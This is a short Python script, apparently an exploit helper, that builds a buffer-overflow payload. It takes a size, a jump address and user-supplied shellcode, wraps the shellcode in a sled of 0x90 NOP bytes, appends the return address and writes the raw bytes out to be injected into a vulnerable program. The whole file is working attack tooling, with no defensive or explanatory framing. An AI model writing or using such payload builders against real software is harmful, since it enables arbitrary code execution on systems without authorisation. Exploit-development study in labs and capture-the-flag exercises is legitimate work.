#!/usr/bin/python

import sys

NOP = "90"

USAGE = """\
{} <size> <addr> <code>

  <size> - size of the complete string (preceded by NOP)
  <addr> - address used to jump in shellcode
  <code> - shellcode to be injected on the target program\
"""

if __name__ == "__main__":
    """
    """

    if len(sys.argv) == 4:

        size = int(sys.argv[1])
        addr = sys.argv[2]
        code = sys.argv[3]

        # verify the input format, if uses '\x' remove it
        if len(code) == code.count("\\x") * 4:
            code = code.replace("\\x", "")
        if len(addr) == addr.count("\\x") * 4:
            addr = addr.replace("\\x", "")

        # compute the NOP head and tail
        nops = int(size - (len(code) / 2))
        if nops % 2 == 0:
            head = NOP * int(nops / 2)
            tail = NOP * int(nops / 2)
        else:
            head = NOP * int((nops - 1) / 2)
            tail = NOP * int((nops + 1) / 2)

        sys.stdout.buffer.write(bytes.fromhex(head + code + tail + addr))

    else:
        print(USAGE.format(sys.argv[0]))
